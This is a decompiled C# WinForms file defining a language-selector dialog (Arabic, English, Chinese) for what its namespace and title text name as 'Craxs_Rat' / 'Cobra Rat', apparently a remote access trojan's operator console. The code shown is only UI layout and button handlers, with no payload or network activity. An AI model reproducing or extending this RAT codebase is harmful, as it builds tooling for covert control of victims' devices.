using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class LanguageSelector : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("copydev")]
	private DrakeUIButton _copydev;

	[AccessedThroughProperty("DrakeUIButton1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButton _DrakeUIButton1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButton2")]
	private DrakeUIButton _DrakeUIButton2;

	public string SelectedLang;

	[field: AccessedThroughProperty("titletext")]
	internal virtual DrakeUISymbolLabel titletext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButton copydev
	{
		[CompilerGenerated]
		get
		{
			return _copydev;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Copydev_Click;
			DrakeUIButton drakeUIButton = _copydev;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_copydev = value;
			drakeUIButton = _copydev;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButton DrakeUIButton1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButton1_Click;
			DrakeUIButton drakeUIButton = _DrakeUIButton1;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_DrakeUIButton1 = value;
			drakeUIButton = _DrakeUIButton1;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButton DrakeUIButton2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButton2_Click;
			DrakeUIButton drakeUIButton = _DrakeUIButton2;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_DrakeUIButton2 = value;
			drakeUIButton = _DrakeUIButton2;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	public LanguageSelector()
	{
		base.Load += LanguageSelector_Load;
		SelectedLang = "";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.titletext = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.copydev = new DrakeUI.Framework.DrakeUIButton();
		this.DrakeUIButton1 = new DrakeUI.Framework.DrakeUIButton();
		this.DrakeUIButton2 = new DrakeUI.Framework.DrakeUIButton();
		base.SuspendLayout();
		this.titletext.Dock = System.Windows.Forms.DockStyle.Top;
		this.titletext.Font = new System.Drawing.Font("Calibri", 15f);
		this.titletext.ForeColor = System.Drawing.Color.SkyBlue;
		this.titletext.Location = new System.Drawing.Point(0, 0);
		this.titletext.Name = "titletext";
		this.titletext.Padding = new System.Windows.Forms.Padding(49, 0, 0, 0);
		this.titletext.Size = new System.Drawing.Size(742, 81);
		this.titletext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.titletext.Symbol = 61870;
		this.titletext.SymbolColor = System.Drawing.Color.SkyBlue;
		this.titletext.SymbolSize = 45;
		this.titletext.TabIndex = 0;
		this.titletext.Text = "Welcome To Cobra Rat . Select You'r Language";
		this.copydev.Cursor = System.Windows.Forms.Cursors.Hand;
		this.copydev.FillColor = System.Drawing.Color.Black;
		this.copydev.FillDisableColor = System.Drawing.Color.SkyBlue;
		this.copydev.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.copydev.FillPressColor = System.Drawing.Color.Black;
		this.copydev.FillSelectedColor = System.Drawing.Color.Black;
		this.copydev.Font = new System.Drawing.Font("Calibri", 12f);
		this.copydev.ForeColor = System.Drawing.Color.SkyBlue;
		this.copydev.Location = new System.Drawing.Point(43, 124);
		this.copydev.Margin = new System.Windows.Forms.Padding(4);
		this.copydev.Name = "copydev";
		this.copydev.RectColor = System.Drawing.Color.SkyBlue;
		this.copydev.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.copydev.Size = new System.Drawing.Size(197, 74);
		this.copydev.Style = DrakeUI.Framework.UIStyle.Custom;
		this.copydev.TabIndex = 15;
		this.copydev.Text = "العربية";
		this.DrakeUIButton1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButton1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButton1.FillDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton1.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton1.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButton1.FillSelectedColor = System.Drawing.Color.Black;
		this.DrakeUIButton1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButton1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton1.Location = new System.Drawing.Point(277, 124);
		this.DrakeUIButton1.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButton1.Name = "DrakeUIButton1";
		this.DrakeUIButton1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton1.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton1.Size = new System.Drawing.Size(197, 74);
		this.DrakeUIButton1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButton1.TabIndex = 16;
		this.DrakeUIButton1.Text = "English";
		this.DrakeUIButton2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButton2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButton2.FillDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton2.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton2.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButton2.FillSelectedColor = System.Drawing.Color.Black;
		this.DrakeUIButton2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButton2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton2.Location = new System.Drawing.Point(502, 124);
		this.DrakeUIButton2.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButton2.Name = "DrakeUIButton2";
		this.DrakeUIButton2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton2.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButton2.Size = new System.Drawing.Size(197, 74);
		this.DrakeUIButton2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButton2.TabIndex = 17;
		this.DrakeUIButton2.Text = "中国人";
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(742, 225);
		base.ControlBox = false;
		base.Controls.Add(this.DrakeUIButton2);
		base.Controls.Add(this.DrakeUIButton1);
		base.Controls.Add(this.copydev);
		base.Controls.Add(this.titletext);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "LanguageSelector";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "LanguageSelector";
		base.TopMost = true;
		base.ResumeLayout(false);
	}

	private void Copydev_Click(object sender, EventArgs e)
	{
		SelectedLang = "AR";
		Close();
	}

	private void DrakeUIButton1_Click(object sender, EventArgs e)
	{
		SelectedLang = "EN";
		Close();
	}

	private void DrakeUIButton2_Click(object sender, EventArgs e)
	{
		SelectedLang = "CN";
		Close();
	}

	private void LanguageSelector_Load(object sender, EventArgs e)
	{
	}
}
